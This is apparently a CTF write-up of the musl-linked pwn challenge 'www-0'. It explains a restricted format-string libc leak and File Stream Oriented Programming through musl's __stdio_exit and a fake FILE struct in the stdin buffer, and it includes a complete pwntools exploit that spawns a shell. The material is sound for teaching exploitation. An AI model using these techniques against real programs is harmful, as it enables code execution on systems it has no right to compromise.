---
date: '2025-07-03T21:58:08+07:00'
draft: false
title: 'File Stream Oriented Programming (FSOP) on Musl Libc'
tags: ["fsop", "musl", "pwn"]
---

A couple months ago, I participated in a local CTF in which there was a very interesting pwn challenge authored by msfir, named `www-0`. The main twist of the challenge was that it's run on an Alpine Linux container, unlike other challenges which usually run on an Ubuntu or Debian container. Since Alpine uses musl instead of glibc as its standard C library, this has the consequence that the binary will be linked to a musl libc, as opposed to the usual glibc. While mostly identical in function, musl is different in implementation when compared to glibc. So, some exploits that work on glibc might not automatically work on musl libc. In this writeup, we'll be exploring how musl libc is implemented, specifically how it handles files and its exit procedures.

## Challenge Overview
[Download Challenge Files](www-0.zip)

You can follow along and try the challenge for yourself if you want to by clicking the download link above. The challenge files include the binary, its source code, and the corresponding Docker files to spin up your own instance. The source code is as follows.
```c{linenos=true}
#include <stdio.h>
#include <stdlib.h>

void gift()
{
    char buf[1024] = {0};
    scanf(" %32[^$n\n]", buf);
    printf(buf);
    putchar('\n');
}

int main()
{
    gift();
    long long *ptr;
    printf("Where: ");
    fflush(stdout);
    scanf("%p", &ptr);
    printf("What: ");
    fflush(stdout);
    scanf("%lli", ptr);
    exit(0);
}
```
```bash
[*] '/home/nouxia/ctf/arkavidia/pwn/www-0/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
```
As a summary, the program will:
1. Ask the user for some input, which is then immediately passed into a `printf` call, resulting in a format string vulnerability.
2. Ask the user for an arbitrary address.
3. Ask the user for an 8-byte integer, which will be written to the aforementioned address.

The challenge is quite simple and the vulnerability is very obvious, but it'll be somewhat tricky to exploit.

## Leaking Libc
The challenge imposes a constraint on the string you're allowed to input. The string must be at most 32 characters long and mustn't contain `$` or `n`. This poses some difficulty as you usually use`$` to specify the offset when trying to leak values off the stack. To get around this, we can use multiple format specifiers to simulate leaking an offset. For example, to leak `%5$p`, we can send in `%p%p%p%p%p` and the 5th `%p` will correspond to the value on the stack at offset 5.

With that out of the way, first things first we need to find the offset of our input buffer, as standard for most format string vulnerabilities.
```bash
$ ./chall_patched
AAAAAAAA%p%p%p%p%p%p
AAAAAAAA00x140x5d0x7ffd12e35bb000x4141414141414141
Where:
```
We find that our buffer sits at offset 6. With this in mind, we can craft the final format string. As mentioned before, we'll send in a GOT entry along with a `%s` format at the right offset to leak a libc address.
```python{linenos=true}
payload = flat(
    b'%p%p%p%p%p%p%p%p|%s'.ljust(24, b'.'),
    exe.got['putchar'],
)
io.sendline(payload)
io.recvuntil(b'|')
libc_leak = u64(io.recv(6).ljust(8, b'\0'))
```
```bash
[+] Starting local process '/home/nouxia/ctf/arkavidia/pwn/www-0/chall_patched': pid 186020
[+] hex(libc_leak) = '0x70383b2f8418'
[*] Switching to interactive mode
.....\xa0?@
Where: $
```
```
pwndbg> vmmap 0x7914c2902418
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x7914c28a0000     0x7914c28b4000 r--p    14000      0 /home/nouxia/ctf/arkavidia/pwn/www-0/ld-musl-x86_64.so.1
►   0x7914c28b4000     0x7914c290b000 r-xp    57000  14000 /home/nouxia/ctf/arkavidia/pwn/www-0/ld-musl-x86_64.so.1 +0x4e418
    0x7914c290b000     0x7914c2941000 r--p    36000  6b000 /home/nouxia/ctf/arkavidia/pwn/www-0/ld-musl-x86_64.so.1
pwndbg> distance 0x7914c2902418 0x7914c28a0000
0x7914c2902418->0x7914c28a0000 is -0x62418 bytes (-0xc483 words)
pwndbg>
```
Awesome, we now have obtained the libc base address. Moving on, let's explore what we can do with an 8-byte overwrite. Notice how after the program writes our 8 bytes, it immediately calls `exit(0)`. So let's start there. Let's explore what actually happens when a program calls `exit`.

## What Happens when `exit()` is Called?
To answer this question, let's take a look at the musl source code. To provide context for the next section, our final plan will revolve around crafting a fake [`FILE` struct](https://github.com/kraj/musl/blob/kraj/master/src/internal/stdio_impl.h), such that `system("/bin/sh")` will be called when that file is closed.
```c{linenos=true}
// File: src/exit/exit.c

#include <stdlib.h>
#include <stdint.h>
#include "libc.h"
#include "pthread_impl.h"
#include "atomic.h"
#include "syscall.h"

...

_Noreturn void exit(int code)
{
	/* Handle potentially concurrent or recursive calls to exit,
	 * whose behaviors have traditionally been undefined by the
	 * standards. Using a custom lock here avoids pulling in lock
	 * machinery and lets us trap recursive calls while supporting
	 * multiple threads contending to be the one to exit(). */
	static volatile int exit_lock[1];
	int tid =  __pthread_self()->tid;
	int prev = a_cas(exit_lock, 0, tid);
	if (prev == tid) a_crash();
	else if (prev) for (;;) __sys_pause();

	__funcs_on_exit();
	__libc_exit_fini();
	__stdio_exit();
	_Exit(code);
}
```
There are 3 functions that can be of our interest here, `__funcs_on_exit`, `__libc_exit_fini`, and `__stdio_exit`. However, so this post doesn't become too long, I'll only be talking about `__stdio_exit`, which is be the function we'll be taking advantage of for our exploit. But as a general overview, `__funcs_on_exit` is where the functions registered by `atexit` will be called, and `__libc_exit_fini` is equivalent to `_dl_fini` on glibc. Below is the source code for `__stdio_exit` and `__ofl_lock`, one of the functions called within it.

```c{linenos=true}
// File: src/stdio/ofl.c

#include "stdio_impl.h"
#include "lock.h"
#include "fork_impl.h"

static FILE *ofl_head;
static volatile int ofl_lock[1];
volatile int *const __stdio_ofl_lockptr = ofl_lock;

FILE **__ofl_lock()
{
        LOCK(ofl_lock);
        return &ofl_head;
}
```

```c{linenos=true}
// File: src/stdio/__stdio_exit.c

#include "stdio_impl.h"

static FILE *volatile dummy_file = 0;
weak_alias(dummy_file, __stdin_used);
weak_alias(dummy_file, __stdout_used);
weak_alias(dummy_file, __stderr_used);

static void close_file(FILE *f)
{
	if (!f) return;
	FFINALLOCK(f);
	if (f->wpos != f->wbase) f->write(f, 0, 0);
	if (f->rpos != f->rend) f->seek(f, f->rpos-f->rend, SEEK_CUR);
}

void __stdio_exit(void)
{
	FILE *f;
	for (f=*__ofl_lock(); f; f=f->next) close_file(f);
	close_file(__stdin_used);
	close_file(__stdout_used);
	close_file(__stderr_used);
}
```
The function `__stdio_exit` is responsible for closing all open `FILE` handles. Furthermore, `__ofl_lock` will return the head of the linked list containing all open `FILE` handles, similar to `_IO_list_all` in glibc. After that, each `FILE` in the list will be closed one by one followed by `stdin`, `stdout`, and `stderr`.

The key thing to observe here is the calls to `f->write` and `f->seek` in `close_file`. The `write` and `seek` members of the `FILE` struct are overwritable pointers. So, if we can insert a pointer to `system` into either `write` or `seek`, we will successfully call `system` when that `FILE` is closed. However, we need to ensure that `f->wpos != f->wbase` or `f->rpos != f->rend` so that the function will be called. To find out the needed offsets in the `FILE` struct, let's take a look at the disassembly of `close_file`.

```asm{linenos=true}
pwndbg> x/30i 0x7ffff7fb829a
   0x7ffff7fb829a:      test   rdi,rdi
   0x7ffff7fb829d:      je     0x7ffff7fb82e9
   0x7ffff7fb829f:      push   rbx
   0x7ffff7fb82a0:      mov    eax,DWORD PTR [rdi+0x8c]
   0x7ffff7fb82a6:      mov    rbx,rdi
   0x7ffff7fb82a9:      test   eax,eax
   0x7ffff7fb82ab:      jns    0x7ffff7fb82e0
   0x7ffff7fb82ad:      mov    rax,QWORD PTR [rbx+0x38]
   0x7ffff7fb82b1:      cmp    QWORD PTR [rbx+0x28],rax     // if (f->wpos != f->wbase)
   0x7ffff7fb82b5:      je     0x7ffff7fb82c1
   0x7ffff7fb82b7:      xor    edx,edx
   0x7ffff7fb82b9:      xor    esi,esi
   0x7ffff7fb82bb:      mov    rdi,rbx
   0x7ffff7fb82be:      call   QWORD PTR [rbx+0x48]         // f->write(f, 0, 0);
```
We find that `wpos` is located at `FILE+0x28`, `wbase` at `FILE+0x38`, and `write` at `FILE+0x48`. Alrighty, so to call `system("/bin/sh")`, our fake `FILE` must have:
1. `FILE+0x0` equal to `"/bin/sh"` in its integer representation. We need this because the first argument to `f->write` is our `FILE` itself.
2. `wpos != wbase` or `FILE+0x28 != FILE+0x38`
3. `write` or `FILE+0x48` equal to `system`

After making our fake `FILE`, the last thing we need to do is to overwrite `ofl_head` such that it points to it. Note that here I choose to overwrite `f->write`, but the same principles apply should you choose to overwrite `f->seek`.

## How do We Write Our Fake `FILE`?
But wait, the `FILE` struct is huge, and we can only write 8 bytes at a time. So, what's the solution? Fortunately, `stdin` in this challenge is buffered. When a file stream is buffered, any input intended for it is explicitly stored in a memory buffer. We can see this for ourselves in the following example.

```
pwndbg> disass gift
Dump of assembler code for function gift:
   ...
   0x000000000040125d <+45>:    lea    rdi,[rip+0xd9c]        # 0x402000
=> 0x0000000000401264 <+52>:    call   0x401060 <scanf@plt>
   0x0000000000401269 <+57>:    mov    rdi,rsp
   ...
End of assembler dump.
pwndbg> b *(gift+57)
Breakpoint 3 at 0x401269
pwndbg> r
Starting program: /home/nouxia/ctf/arkavidia/pwn/www-0/chall_patched
AAAAAAAA
```
Here, I set a breakpoint right after a `scanf` call, then I sent in 8 `"A"s`

```
pwndbg> search AAAAAAAA
Searching for byte: b'AAAAAAAA'
[anon_7ffff7ffc] 0x7ffff7ffc2e8 'AAAAAAAA\n'
[stack]         0x7fffffffd270 'AAAAAAAA'
pwndbg> vmmap 0x7ffff7ffc2e8
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x7ffff7ffb000     0x7ffff7ffc000 rw-p     1000  a1000 /home/nouxia/ctf/arkavidia/pwn/www-0/ld-musl-x86_64.so.1
►   0x7ffff7ffc000     0x7ffff7fff000 rw-p     3000      0 [anon_7ffff7ffc] +0x2e8
pwndbg> x/gx &stdin
0x7ffff7ffad60 <stdin>: 0x00007ffff7ffb180
pwndbg> x/20gx 0x00007ffff7ffb180
0x7ffff7ffb180: 0x0000000000000009      0x00007ffff7ffc2f0
0x7ffff7ffb190: 0x00007ffff7ffc2f1      0x00007ffff7fb8277
0x7ffff7ffb1a0: 0x0000000000000000      0x0000000000000000
0x7ffff7ffb1b0: 0x0000000000000000      0x0000000000000000
0x7ffff7ffb1c0: 0x00007ffff7fb832b      0x0000000000000000
0x7ffff7ffb1d0: 0x00007ffff7fb83f6      0x00007ffff7ffc2e8 <-- This is where our "AAAAAAAA" is stored. As a matter of fact, this address is the buffer used for stdin
0x7ffff7ffb1e0: 0x0000000000000400      0x0000000000000000
0x7ffff7ffb1f0: 0x0000000000000000      0x0000000000000000
0x7ffff7ffb200: 0x0000000000000000      0xffffffffffffffff
0x7ffff7ffb210: 0x0000000000000000      0x0000000000000000
pwndbg>
```
After that, I searched the memory space for those 8 `"A"s` and found that it's stored in 2 places. One in the stack and the other in some place near libc. After further investigation, it can be found that this "some place" is actually the buffer used for `stdin`. If `stdin` were unbuffered in this challenge, those 8 `"A"s` would be discarded after it's been processed and wouldn't be stored in memory.

So, knowing this, we can insert our fake `FILE` right after our normal input to `scanf`. Then, we overwrite `ofl_head` to point to the `stdin` buffer. With this setup, `system("/bin/sh")` will be called when `__stdio_exit` is executed.

## Solve Script
```python{linenos=true}
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = 'wt.exe wsl -d Ubuntu'.split()

exe = context.binary = ELF(args.EXE or './chall_patched')

host = args.HOST or 'localhost'
port = int(args.PORT or 8002)

if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    library_path = libcdb.download_libraries('ld-musl-x86_64.so.1')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('ld-musl-x86_64.so.1')
else:
    libc = ELF('ld-musl-x86_64.so.1')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *(main+118)
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

# Leak musl address
payload = flat(
    b'%p%p%p%p%p%p%p%p|%s'.ljust(24, b'.'),
    exe.got['putchar'],
)
io.sendline(payload)
io.recvuntil(b'|')
libc_leak = u64(io.recv(6).ljust(8, b'\0'))
libc_address = libc_leak - 0x62418
system = libc_address + 0x5bb7e

ofl_head = libc_address + 0xa4e88
scanf_buf = libc_address + 0xa32e8
log.success(f'{hex(libc_leak) = }')
log.success(f'{hex(libc_address) = }')
log.success(f'{hex(ofl_head) = }')
log.success(f'{hex(scanf_buf) = }')

# Create a fake file and overwrite ofl_head to point to it
io.sendlineafter(b'Where: ', hex(ofl_head).encode())
io.sendlineafter(b'What: ', flat(
    (str(scanf_buf + 0x10).encode() + b'\n').ljust(16, b'\0'),
    int.from_bytes(b'/bin/sh\0', 'little'),
    4 * p64(0x0),
    0x0, # wpos
    0x0,
    0x1, # wbase
    0x0, # read
    system, # write
))

io.interactive()
```

```bash
$ ./solve.py
[*] '/home/nouxia/ctf/arkavidia/pwn/www-0/chall_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
[*] '/home/nouxia/ctf/arkavidia/pwn/www-0/ld-musl-x86_64.so.1'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[+] Opening connection to localhost on port 8002: Done
[+] hex(libc_leak) = '0x7add684b6418'
[+] hex(libc_address) = '0x7add68454000'
[+] hex(ofl_head) = '0x7add684f8e88'
[+] hex(scanf_buf) = '0x7add684f72e8'
[*] Switching to interactive mode
$ ls
chall
flag.txt
$ cat flag.txt
flag{test}
$
```

---

## References
1. musl source code - [https://github.com/kraj/musl](https://github.com/kraj/musl)